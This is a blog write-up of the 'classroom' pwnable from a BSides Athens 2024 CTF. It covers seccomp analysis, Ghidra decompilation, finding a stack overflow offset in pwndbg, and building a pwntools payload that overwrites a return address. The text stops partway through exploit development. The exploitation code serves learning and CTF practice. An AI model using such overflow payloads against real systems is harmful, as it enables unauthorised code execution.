---            
title: "Intro to pwnables"
categories:
  - blog                          
tags:
  - pwn
  - AFL
# classes: wide
excerpt: "Walkthrough of a pwnable using pwntools, pwndbg, AFL"
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true
---    

> This is an overly documented approach to solving a binary challenge, a pwnable in particular.
> Another way to view it is as a (very) light introduction to pwnables, pwntools, gdb, AFL, and most probably poor decisions overall :)

Capture The Flag events are a fantastic way to sharpen your cybersecurity skills, and the one provided by HTB in the recent BSiDES Athens 2024 Security Conference was no exception. 

Among the various challenges presented, there was a pwnable titled `classroom`. Although it was rated easy - some may say fundamental - it saw only three solves during the event [^Rant]. What i want to achieve with this high level walkthrough of the `classroom` pwn, is to describe the thought process, the tools, and offer insights that could help beginners and intermediate participants to enhance their pwn(tm).

[^Rant]: And ok, yeah, it was not a big event, nor was the CTF any larger. But only 3 solves? What's the play here? Everybody else is killing it out there in CTFs and IRL, and we are doing what exactly? Yes, there are teams from GR that are having success in global events, of course. But how are these teams seeded if in entry level events we are failing at the obvious? How is this not a problem, both for the scene and the security industry altogether?

# Target
## Checksec

First up, what are we up against? We can use [checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec) to check what security settings does our binary support.

```bash
~/D/W/b/pwn $ pwn checksec classroom 
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

We got plenty of info already. The important pieces here are that:
- "No PIE", the binary is not relocatable and will always be loaded at a fixed address, in this case, `0x400000` -- Take a note, this does not mean that memory allocations happening during runtime will be at a predictable place, nor that same addresses will occur across runs.
- We get RWX segments, executable stack, no stack canaries, and the NX bit not set. In a nutshell, in which ever buffer we are writting at, high chances are that it is going to be executable space (#not). 

## Interacting with the target

If we run the target locally we have what it seems to be a very simple program:

```
~/D/W/b/pwn $ ./classroom 
Kids must follow the rules!
1. No cheating!   ❌
2. No swearing!   ❌
3. No 🚩 sharing! ❌

Is everything clear? (y/n)
> y

Alright! Do you have any more questions? (y/n)
> y
Feel free to ask!
>> 
Very interesting question! Let me think about it..

Alright! Do you have any more questions? (y/n)
> y
Feel free to ask!
>> y
Very interesting question! Let me think about it..

Alright! Do you have any more questions? (y/n)
> y
Feel free to ask!
>> y
Very interesting question! Let me think about it..

Alright! Do you have any more questions? (y/n)
> y
Feel free to ask!
>> y
Very interesting question! Let me think about it..

Alright! Do you have any more questions? (y/n)
> y
Enough questions for today class...
Well, maybe a last one and then we finish!
> y
Have a nice day!!
fish: Job 1, './classroom' terminated by signal SIGSYS (Bad system call)
```

Hmm, a bit strict for a program, but a couple of prompts, and plently of space to pass input. An interesting part is that we are exiting due to a bad system call. 
This typically occurs when a process is implementing a sandboxing mechanism of sorts. If we run the program again in strace we get:

```c
~/D/W/b/pwn $ strace ./classroom
execve("./classroom", ["./classroom"], 0x7ffe250f6ef0 /* 32 vars */) = 0
brk(NULL)                               = 0x2531000
...[snip]...                    = 2
write(1, "Have a nice day!!\n", 18Have a nice day!!
)     = 18
exit_group(0)                           = 231
+++ killed by SIGSYS +++
fish: Job 1, 'strace ./classroom' terminated by signal SIGSYS (Bad system call)
~/D/W/b/pwn [SIGSYS]$ 
```

Indeed the very last thing the program executed is a the [exit_group()](https://www.man7.org/linux/man-pages/man2/exit_group.2.html) system call. 

If we take a closer look at strace we see that the program sets some [seccomp](https://en.wikipedia.org/wiki/Seccomp) rules and does implement a sandbox by limiting the interaction it can have with the OS - and most probably the exit_group system call is not allowed.

```c
...[snip]...
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f588af44000, 102291)          = 0
alarm(127)                              = 0
seccomp(SECCOMP_SET_MODE_STRICT, 0x1, NULL) = -1 EINVAL (Invalid argument)
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, NULL) = -1 EFAULT (Bad address)
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_LOG, NULL) = -1 EFAULT (Bad address)
seccomp(SECCOMP_GET_ACTION_AVAIL, 0, [SECCOMP_RET_LOG]) = 0
seccomp(SECCOMP_GET_ACTION_AVAIL, 0, [SECCOMP_RET_KILL_PROCESS]) = 0
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_SPEC_ALLOW, NULL) = -1 EFAULT (Bad address)
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, NULL) = -1 EFAULT (Bad address)
seccomp(SECCOMP_GET_NOTIF_SIZES, 0, {seccomp_notif=80, seccomp_notif_resp=24, seccomp_data=64}) = 0
seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC_ESRCH, NULL) = -1 EFAULT (Bad address)
getrandom("\x46\xa8\x58\x67\x54\xa9\xa0\x73", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x11d0000
...[snip]...
```

We can use [seccomp-tool](https://github.com/david942j/seccomp-tools) to getter a better understanding of the rules applied:

```shell
~/D/W/b/pwn $ seccomp-tools dump ./classroom 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

The only syscalls we can use are [read()](https://man7.org/linux/man-pages/man2/read.2.html), [open()](https://man7.org/linux/man-pages/man2/open.2.html),  [write()](https://man7.org/linux/man-pages/man2/write.2.html), and [exit()](https://man7.org/linux/man-pages/man2/exit.2.html). It's limited, but it's more than what we need.

# Static Analysis

There are many tools we can use for such a task, but let's make our life easy and use [ghidra](https://ghidra-sre.org/), which offers code decompilation.

The main function of `classroom` is as follows:

```c
undefined8 main(void)

{
  size_t sVar1;
  
  setup();
  sec();
  sVar1 = strlen(s_Kids_must_follow_the_rules!_1._N_00400db0); 
  write(1,s_Kids_must_follow_the_rules!_1._N_00400db0,sVar1);
  read(0,ans,0x60);                                             # read our input into a 0x60 bytes buffer
  kinder();
  sVar1 = strlen("Have a nice day!!\n");
  write(1,"Have a nice day!!\n",sVar1);
  return 0;
}

```

Fairly straight forward. 
- In `setup()` the process un-sets stream buffering for FDs 0 and 1, and sets a `SIGALRM` for ~2 minutes, you snooze you lose i guess.
- In `sec()` the process sets the `seccomp` rules described earlier.
- What is interesting is that the input we submit to the `Kids must follow the rules (y/n)` question is read into a buffer (labeled `ans`) capable of the holding up to 0x60 hex bytes (or 96 in decimal)

The next function is `kinder()`, 

```c
void kinder(void)

{
  size_t sVar1;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  char local_5d [5];
  undefined local_58 [32];
  char *local_38;
  char *local_30;
  char *local_28;
  char *local_20;
  char *local_18;
  int local_c;
  
  local_c = 0;
  local_18 = "Have a nice day!\n";
  local_20 = "Very interesting question! Let me think about it..\n";
  local_28 = "\nAlright! Do you have any more questions? (y/n)\n> ";
  local_30 = "Feel free to ask!\n>> ";
  local_38 = "Enough questions for today class...\nWell, maybe a last one and then we finish!\n> " ;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  while (local_c == 0) {
    counter = counter + 1;
    sVar1 = strlen(local_28);                     # Very interesting question! Let me think about it..
    write(1,local_28,sVar1);
    read(0,local_5d,4);                           # read 4 bytes into local_5d
    if (counter == 5) {
      local_c = 1;                                # last time we are in while when local_c = 1
      sVar1 = strlen(local_38);
      write(1,local_38,sVar1);
      read(0,&local_88,0x14c);
    }
    else if ((local_5d[0] == 'y') || (local_5d[0] == 'Y')) {
      sVar1 = strlen(local_30);
      write(1,local_30,sVar1);
      read(0,local_58,0x1f);
      sVar1 = strlen(local_20);
      write(1,local_20,sVar1);
    }
    else {
      local_c = 1;                               # if we answer anything other that y or Y we return to main
    }
  }
  return;
}
```

Again, this is short function with a main loop that interacts with the user. 

The main idea is that when the counter is 5, it will read `14c` hex bytes (332 in dec) of user input into the address pointed by `&local88`. 
The disassembly of the specific line `read(0,&local_88,0x14c);` provides a better view:

```c
00400a32 48  8d  45  80              LEA    RAX => local_88 ,[RBP-0x80]
00400a36 ba  4c  01  00  00          MOV    EDX ,0x14c
00400a3b 48  89  c6                  MOV    RSI ,RAX
00400a3e bf  00  00  00  00          MOV    EDI ,0x0
00400a43 e8  f8  fc  ff  ff          CALL   <EXTERNAL>::read   ssize_t read(int __fd, void * __
```

&local88 points `80` hex bytes (128 in dec) from the function base address. Given that read() provides no security checks and does not respect function boundaries, we can overwrite the function base address at offset 128 of our input string and keep writing data on the stack for 332-128 bytes more. 

Note: it is worth mentioning that ChatGPT correctly identifies the buffer overflow, although it fails to describe it correctly :p 

![gpt](/assets/images/0xvm-classroom-gpt.png)

# Dynamic Analysis

Let's validate our findings so far. 

We are creating a string of 360 chars, which should be enough to overflow the buffer, and submit it at as a reply to the 5th question.

```shell
~/D/W/b/pwn $ pwn cyclic 360
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaad

~/D/W/b/pwn $ ./classroom 
Kids must follow the rules!
1. No cheating!   ❌
2. No swearing!   ❌
3. No 🚩 sharing! ❌

Is everything clear? (y/n)
> y 
...[snip]...
Enough questions for today class...
Well, maybe a last one and then we finish!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaad
fish: Job 1, './classroom' terminated by signal SIGSEGV (Address boundary error)
```

As expected, there's a segmentation fault. Let's turn to [pwndbg](https://github.com/pwndbg/pwndbg) 


```c
~/D/W/b/pwn $ gdb ./classroom 
...[snip]...
pwndbg> r
...[snip]...
Enough questions for today class...
Well, maybe a last one and then we finish!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaad

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400aea in kinder ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────
*RAX  0x14c
*RBX  0x7fffffffe1c8 —▸ 0x7fffffffe480 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
*RCX  0x7ffff7ea3a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x14c
 RDI  0
*RSI  0x7fffffffe010 ◂— 0x6161616261616161 ('aaaabaaa')
*R8   0xff00
*R9   7
*R10  7
*R11  0x246
 R12  0
*R13  0x7fffffffe1d8 —▸ 0x7fffffffe4af ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0
 R15  0
*RBP  0x6261616962616168 ('haabiaab')
*RSP  0x7fffffffe098 ◂— 0x6261616b6261616a ('jaabkaab')
*RIP  0x400aea (kinder+410) ◂— ret 
───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────
► 0x400aea <kinder+410>    ret                                <0x6261616b6261616a>










─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe098 ◂— 0x6261616b6261616a ('jaabkaab')
01:0008│     0x7fffffffe0a0 ◂— 0x6261616d6261616c ('laabmaab')
02:0010│     0x7fffffffe0a8 ◂— 0x6261616f6261616e ('naaboaab')
03:0018│     0x7fffffffe0b0 ◂— 0x6261617162616170 ('paabqaab')
04:0020│     0x7fffffffe0b8 ◂— 0x6261617362616172 ('raabsaab')
05:0028│     0x7fffffffe0c0 ◂— 0x6261617562616174 ('taabuaab')
06:0030│     0x7fffffffe0c8 ◂— 0x6261617762616176 ('vaabwaab')
07:0038│     0x7fffffffe0d0 ◂— 0x6261617962616178 ('xaabyaab')
───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
 ► 0         0x400aea kinder+410
   1 0x6261616b6261616a
   2 0x6261616d6261616c
   3 0x6261616f6261616e
   4 0x6261617162616170
   5 0x6261617362616172
   6 0x6261617562616174
   7 0x6261617762616176
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

At the `SIGSEGV` we get 3 registers pointing to memory we can write at:

```shell
~/D/W/b/pwn $ cyclic -l 0x6161616261616161 # $rsi
0
~/D/W/b/pwn $ cyclic -l 0x6261616962616168 # $rbp
128
~/D/W/b/pwn $ cyclic -l 0x6261616b6261616a # $rsp -- ret overwrite
136
```

If we run again by setting a breakpoint exactly after read() returns we get:

```c
Alright! Do you have any more questions? (y/n)
> y
Enough questions for today class...
Well, maybe a last one and then we finish!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaa

Breakpoint 1, 0x0000000000400a48 in kinder ()                                     # exactly after read(0,&local_88,0x14c);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x14c
*RBX  0x7fffffffe1c8 —▸ 0x7fffffffe480 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
*RCX  0x7ffff7ea3a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x14c
 RDI  0
*RSI  0x7fffffffe010 ◂— 0x6161616261616161 ('aaaabaaa')
*R8   0xff00
*R9   7
*R10  7
*R11  0x246
 R12  0
*R13  0x7fffffffe1d8 —▸ 0x7fffffffe4af ◂— 'USER=kidd'
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0
 R15  0
*RBP  0x7fffffffe090 ◂— 0x6261616962616168 ('haabiaab')
*RSP  0x7fffffffe010 ◂— 0x6161616261616161 ('aaaabaaa')
*RIP  0x400a48 (kinder+248) ◂— jmp 0x400ade
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── 
 ► 0x400a48 <kinder+248>    jmp    kinder+398                  <kinder+398>
    ↓
   0x400ade <kinder+398>    cmp    dword ptr [rbp - 4], 0     0x62616167 - 0x0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
   0x400ae2 <kinder+402>    je     kinder+107                  <kinder+107>
 
   0x400ae8 <kinder+408>    nop    
   0x400ae9 <kinder+409>    leave  
   0x400aea <kinder+410>    ret    
 
   0x400aeb <setup>         push   rbp
   0x400aec <setup+1>       mov    rbp, rsp
   0x400aef <setup+4>       mov    rax, qword ptr [rip + 0x20153a]     RAX, [stdin@@GLIBC_2.2.5]
   0x400af6 <setup+11>      mov    ecx, 0                              ECX => 0
   0x400afb <setup+16>      mov    edx, 2                              EDX => 2
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffe010 ◂— 0x6161616261616161 ('aaaabaaa')
01:0008│-078     0x7fffffffe018 ◂— 0x6161616461616163 ('caaadaaa')
02:0010│-070     0x7fffffffe020 ◂— 0x6161616661616165 ('eaaafaaa')
03:0018│-068     0x7fffffffe028 ◂— 0x6161616861616167 ('gaaahaaa')
04:0020│-060     0x7fffffffe030 ◂— 0x6161616a61616169 ('iaaajaaa')
05:0028│-058     0x7fffffffe038 ◂— 0x6161616c6161616b ('kaaalaaa')
06:0030│-050     0x7fffffffe040 ◂— 0x6161616e6161616d ('maaanaaa')
07:0038│-048     0x7fffffffe048 ◂— 0x616161706161616f ('oaaapaaa')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x400a48 kinder+248
   1 0x6261616b6261616a
   2 0x6261616d6261616c
   3 0x6261616f6261616e
   4 0x6261617162616170
   5 0x6261617362616172
   6 0x6261617562616174
   7 0x6261617762616176
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Examining memory at `$rbp-128`.

```c
pwndbg> x/90x $rbp-128-16
0x7fffffffe000: 0x006032a0      0x00000000      0x00400a48      0x00000000
0x7fffffffe010: 0x61616161      0x61616162      0x61616163      0x61616164
0x7fffffffe020: 0x61616165      0x61616166      0x61616167      0x61616168
0x7fffffffe030: 0x61616169      0x6161616a      0x6161616b      0x6161616c
0x7fffffffe040: 0x6161616d      0x6161616e      0x6161616f      0x61616170
0x7fffffffe050: 0x61616171      0x61616172      0x61616173      0x61616174
0x7fffffffe060: 0x61616175      0x61616176      0x61616177      0x61616178
0x7fffffffe070: 0x61616179      0x6261617a      0x62616162      0x62616163
0x7fffffffe080: 0x62616164      0x62616165      0x62616166      0x62616167
0x7fffffffe090: 0x62616168      0x62616169      0x6261616a      0x6261616b
0x7fffffffe0a0: 0x6261616c      0x6261616d      0x6261616e      0x6261616f
0x7fffffffe0b0: 0x62616170      0x62616171      0x62616172      0x62616173
0x7fffffffe0c0: 0x62616174      0x62616175      0x62616176      0x62616177
0x7fffffffe0d0: 0x62616178      0x62616179      0x6361617a      0x63616162
0x7fffffffe0e0: 0x63616163      0x63616164      0x63616165      0x63616166
0x7fffffffe0f0: 0x63616167      0x63616168      0x63616169      0x6361616a
0x7fffffffe100: 0x6361616b      0x6361616c      0x6361616d      0x6361616e
0x7fffffffe110: 0x6361616f      0x63616170      0x63616171      0x63616172
0x7fffffffe120: 0x63616173      0x63616174      0x63616175      0x63616176
0x7fffffffe130: 0x63616177      0x63616178      0x63616179      0x6461617a
0x7fffffffe140: 0x64616162      0x64616163      0x64616164      0x64616165
0x7fffffffe150: 0x64616166      0x64616167      0x64616168      0x00007fff
0x7fffffffe160: 0x00400b38      0x00000000
```

And we get our full payload, unmangled. Excellent! 

Stepping forward until the `ret` instruction and we identify the bytes stored at `$rbp+8` `0x7fffffffe098` being the return address at `ret`: 

```c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400aea in kinder ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────── 
 RAX  0x14c
 RBX  0x7fffffffe1c8 —▸ 0x7fffffffe480 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7ffff7ea3a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x14c
 RDI  0
 RSI  0x7fffffffe010 ◂— 0x6161616261616161 ('aaaabaaa')
 R8   0xff00
 R9   7
 R10  7
 R11  0x246
 R12  0
 R13  0x7fffffffe1d8 —▸ 0x7fffffffe4af ◂— 'USER=kidd'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0
 R15  0
 RBP  0x6261616962616168 ('haabiaab')
 RSP  0x7fffffffe098 ◂— 0x6261616b6261616a ('jaabkaab')
 RIP  0x400aea (kinder+410) ◂— ret 
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x400a48 <kinder+248>    jmp    kinder+398                  <kinder+398>
    ↓
   0x400ade <kinder+398>    cmp    dword ptr [rbp - 4], 0
   0x400ae2 <kinder+402>    je     kinder+107                  <kinder+107>
 
   0x400ae8 <kinder+408>    nop    
   0x400ae9 <kinder+409>    leave  
 ► 0x400aea <kinder+410>    ret                                <0x6261616b6261616a>



───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe098 ◂— 0x6261616b6261616a ('jaabkaab')
01:0008│     0x7fffffffe0a0 ◂— 0x6261616d6261616c ('laabmaab')
02:0010│     0x7fffffffe0a8 ◂— 0x6261616f6261616e ('naaboaab')
03:0018│     0x7fffffffe0b0 ◂— 0x6261617162616170 ('paabqaab')
04:0020│     0x7fffffffe0b8 ◂— 0x6261617362616172 ('raabsaab')
05:0028│     0x7fffffffe0c0 ◂— 0x6261617562616174 ('taabuaab')
06:0030│     0x7fffffffe0c8 ◂— 0x6261617762616176 ('vaabwaab')
07:0038│     0x7fffffffe0d0 ◂— 0x6261617962616178 ('xaabyaab')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x400aea kinder+410
   1 0x6261616b6261616a
   2 0x6261616d6261616c
   3 0x6261616f6261616e
   4 0x6261617162616170
   5 0x6261617362616172
   6 0x6261617562616174
   7 0x6261617762616176
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

`0x6261616b6261616a` is not a valid address, hence the segmentation fault. 

So, how can we abuse this? There are a couple of options, perhaps first off, finding some gadgets that `jmp` close to `$rsi` (since there we have our full payload), but the binary is relatively small and not many gadgets are available. Additionally, we can also assume that ASLR is enabled at the target so hardcodding a stack address won't exactly cut it. 

What we also have is the `ans` buffer identified earlier, that holds the input provided in the first answer we submitted. This is an interesting prospect since the binary is compiled with NO-PIE. So, the ans buffer will be located at the very same address across runs.

Looking further into `ans` with `ghidra`, we observe that `ans` is referenced in two locations in the program, in the function `main()` and the function `kids_are_not_allowed_here()`

![ghidra](/assets/images/0xvm-classroom-ghidra.png)

What is even more interesting is a `CALL` instruction at `0x40094b` to the `RDX` register that points to the `ans` buffer.

The decompilation of the `kids_are_not_allowed_here` function provides more info:

```c
void kids_are_not_allowed_here(void)

{
  size_t __n;
  
  __n = strlen(s_What_are_you_doing_here?!_Kids_a_00400c68);
  write(1,s_What_are_you_doing_here?!_Kids_a_00400c68,__n);
  (*(code *)ans)();
  return;
}
```

You might have seen the `(*(code *)ans)();` or a similar notation in shellcode runners. Essentially, this is type casting of the buffer `ans` to a function pointer `(void *)`, and calling it.

The disassembly provides a much clearer picture:

```c
**************************************************************
*                          FUNCTION                          *
**************************************************************
                             undefined kids_are_not_allowed_here()
             undefined         AL:1               <RETURN>
             undefined8        Stack[-0x10]:8     local_10                  XREF[3]:     0040091b(W), 
                                                                                         0040091f(R), 
                                                                                         0040092e(R)  
                             kids_are_not_allowed_here                       XREF[3]:     Entry Point(*), 00400e5c, 00400f38(*)  
        0040090c 55                        PUSH   RBP
        0040090d 48 89 e5                  MOV    RBP,RSP
        00400910 48 83 ec 10               SUB    RSP,0x10
        00400914 48 8d 05 4d 03 00 00      LEA    RAX,[s_What_are_you_doing_here?!_Kids_a_00400c   = "What are you doing here?! Kid
        0040091b 48 89 45 f8               MOV    qword ptr [RBP + local_10],RAX=>s_What_are_you   = "What are you doing here?! Kid
        0040091f 48 8b 45 f8               MOV    RAX,qword ptr [RBP + local_10]
        00400923 48 89 c7                  MOV    RDI=>s_What_are_you_doing_here?!_Kids_a_00400c   = "What are you doing here?! Kid
        00400926 e8 f5 fd ff ff            CALL   <EXTERNAL>::strlen                               size_t strlen(char * __s)
        0040092b 48 89 c2                  MOV    RDX,RAX
        0040092e 48 8b 45 f8               MOV    RAX,qword ptr [RBP + local_10]
        00400932 48 89 c6                  MOV    RSI=>s_What_are_you_doing_here?!_Kids_a_00400c   = "What are you doing here?! Kid
        00400935 bf 01 00 00 00            MOV    EDI,0x1
        0040093a e8 c1 fd ff ff            CALL   <EXTERNAL>::write                                ssize_t write(int __fd, void * _
        0040093f 48 8d 15 fa 16 20 00      LEA    RDX,[ans]
        00400946 b8 00 00 00 00            MOV    EAX,0x0
        0040094b ff d2                     CALL   RDX=>ans
        0040094d 90                        NOP
        0040094e c9                        LEAVE
        0040094f c3                        RET

```

In a nutshell, jumping to a location within the, or at, function `kids_are_not_allowed_here()`, will grant us code execution. (Anywhere before `0x0040093f` that is.)

# Exploit development

We already have a general idea of the approach we would like to follow:
1. Write a payload (#1) to provide as a response to the `Kids must follow the rules (y/n)` question. This will be stored at the `ans` buffer.
2. Overflow the buffer at `kinder` function 5th question with a payload (#2) overwritting `$rbp` and `$rsp` registers,
3. Continue executiue, eventaully overwriting the ret address of the `kinder` funtion with the `kids_are_not_allowed_here` function address.

## Pwntools

One can start blank, modify everybody's favorite [exploit template](https://github.com/epi052/osed-scripts/blob/main/exploit-template.py), or use [pwntools](https://docs.pwntools.com/en/stable/) embedded template, we'll use the later.

```python
~/D/W/b/pwn $ pwn template --host 192.168.13.37 --port 8000 ./classroom | tee sploit.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.13.37 --port 8000 ./classroom
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './classroom')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.13.37'
port = int(args.PORT or 8000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

~/D/W/b/pwn $ 
```

We'll modify the template to:
- handle input/output with the `classroom` binary.
- send payload1 at `Kids must follow the rules (y/n)` question  
- send payload2 at the `kinder` function 5th question

For payload2 we will modify the template payload from:

```python
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
```

to the following: 

```python
payload2 = fit({
    136: p64(0x40090c)
    }, filler=asm(shellcraft.nop()), length=400)
```

this will produce a byte array of 400 nops inclduing a 64bit packed value at offset 136. 

As discussed earlier, at that offset exists the return value we aim to overwrite, and we are overwritting with the `kids_are_not_allowed_here()` function address: `0x40090c`

In `ipython3` we can verify:

```python
~/D/W/b/pwn $ ipython3
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.20.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from pwn import *

In [2]: payload2 = fit({
    ...: 136: p64(0x40090c)
    ...: }, filler=asm(shellcraft.nop()), length=400)

In [3]: print(hexdump(payload2))
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
